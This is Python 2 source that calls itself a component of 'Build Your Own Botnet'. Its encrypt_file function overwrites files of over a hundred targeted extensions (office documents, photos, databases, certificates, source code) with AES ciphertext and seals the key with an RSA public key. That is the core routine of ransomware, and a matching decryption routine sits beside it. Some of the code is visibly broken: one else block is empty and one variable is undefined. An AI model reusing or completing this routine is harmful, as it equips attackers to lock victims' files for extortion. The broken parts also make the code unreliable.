#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library

import os
import sys
import json
import struct
import base64
import socket
import urllib
import logging
import tempfile
import cStringIO

# debugging logger

byob_key = r'SOFTWARE\BYOB' if os.name == 'nt' else os.path.join(tempfile.gettempdir(), 'BYOB.txt')
debugger = logging.getLogger(__name__)
debugger.setLevel(logging.DEBUG)
debugger.addHandler(logging.StreamHandler())

# external modules

try:
    import Crypto.Util
    import Crypto.Random
    import Crypto.Hash.MD5
    import Crypto.Hash.SHA256
    import Crypto.PublicKey.RSA
    import Crypto.Cipher.PKCS1_OAEP
    import Crypto.Cipher.AES
except ImportError as e:
    debugger.debug(str(e))
    execfile('__init__.py')
    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])

try:
    if os.name == 'nt':
        import _winreg
except ImportError:
    debugger.debug(str(e))
    execfile('__init__.py')
    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])


def encrypt_aes(data, key):
    try:
        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        output = b''.join((cipher.nonce, tag, ciphertext))
        return base64.b64encode(output)
    except Exception as e:
        print("{} error: {}".format(encrypt_aes.func_name, str(e)))

def decrypt_aes(data, key):
    """
    Decrypt data with AES cipher in authenticated OCB mode
    """
    try:
        data = cStringIO.StringIO(base64.b64decode(data))
        nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)
    except Exception as e1:
        try:
            return cipher.decrypt(ciphertext)
        except Exception as e2:
            debugger.debug("{} error: {}".format(decrypt_aes.func_name, str(e2)))

def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding='$'):
    """
    Encrypt data with XOR cipher
    """
    data    = bytes(data) + (int(block_size) - len(bytes(data)) % int(block_size)) * bytes(padding)
    blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
    vector  = os.urandom(8)
    result  = [vector]
    for block in blocks:
        block   = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, block))
        v0, v1  = struct.unpack("!2L", block)
        k       = struct.unpack("!4L", key[:key_size])
        sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
        for round in range(num_rounds):
            v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
            sum = (sum + delta) & mask
            v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
        output  = vector = struct.pack("!2L", v0, v1)
        result.append(output)
    return base64.b64encode(bytes().join(result))

def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding='\x00'):
    """
    Decrypt data with XOR cipher
    """
    data    = base64.b64decode(data)
    blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
    vector  = blocks[0]
    result  = []
    for block in blocks[1:]:
        v0, v1 = struct.unpack("!2L", block)
        k = struct.unpack("!4L", key[:key_size])
        delta, mask = 0x9e3779b9L, 0xffffffffL
        sum = (delta * num_rounds) & mask
        for round in range(num_rounds):
            v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
            sum = (sum - delta) & mask
            v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
        decode = struct.pack("!2L", v0, v1)
        output = str().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, decode))
        vector = block
        result.append(output)
    return str().join(result).rstrip(padding)

def encrypt_file(filepath, rsa_key):
    """
    Generate a 256-bit key to encrypt a file with symmetric encryption
    (AES cipher in authenticated OCB mode), use asymmetric encryption
    (2048-bit RSA public key using a PKCS1_OAEP cipher) to encrypt the 
    encryption key
    ``Input``
    :param str filepath:          target filename
    :param RsaKey rsa_key:        2048-bit public RSA key
    ``Returns``
    :output str filepath:         absolute path of target filename
    :output str key:              RSA encrypted AES encryption key
    """
    try:
        if os.path.isfile(filepath):
            if os.path.splitext(filepath)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp','.py','.php','.html','.css','.js','.rb','.xml','.py','.pyc','.wmi','.sh','.spec','.asp','.aspx','.plist','.json','.sql','.vbs','.ps1']:
                if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
                    key = Crypto.Random.get_random_bytes(32)
                    with open(filepath, 'rb') as fp:
                        data = fp.read()
                    with open(filepath, 'wb') as fd:
                        fd.write(encrypt_aes(data, key))
                    cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
                    key = base64.b64encode(cipher.encrypt(key))
                    return filepath, key
                else:
                    debugger.debug("Invalid RSA key")
            else:
                debugger.debug('Non-target file type: {}'.format(filepath))
        else:
            debugger.debug("File '{}' not found".format(filepath))
    except Exception as e:
        debugger.debug("{} error: {}".format(encrypt_file.func_name, str(e)))

def decrypt_file(filepath, rsa_key):
    """
    Decrypt a file that has been encrypted by AES-256 encryption
    and the symmetric encryption key has been asymmetrically encrypted 
    with a 2048-bit RSA key
    ``Input``
    :param str filepath:          target filename
    :param RsaKey rsa_key:        2048-bit private RSA key
    ``Returns``
    :output bool result:          True if succesful, otherwise False
    """
    try:
        if os.path.isfile(filepath):
            if globals().get('BYOB_KEY'):
                if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
                    cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
                    if os.name == 'nt':
                        reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, BYOB_KEY, 0, _winreg.KEY_WRITE)
                        _winreg.EnumValue(reg_key, filepath)
                        _winreg.CloseKey(reg_key)
                    else:
                    
                    key = cipher.decrypt(base64.b64decode(key))
                    with open(filepath, 'rb') as fp:
                        ciphertext = fp.read()
                    plaintext = decrypt_aes(ciphertext, key)
                    with open(filepath, 'wb') as fd:
                        fd.write(plaintext)
                    return True
                else:
                    debugger.debug("Invalid RSA key (expected {}, received {})".format(Crypto.PublicKey.RSA.RsaKey, rsa_key))
            else:
                debugger.debug("Error: missing constant BYOB_KEY")
        else:
            debugger.debug("File '{}' not found".format(filepath))
    except Exception as e:
        debugger.debug("{} error: {}".format(decrypt_file.func_name, str(e)))
    return False

    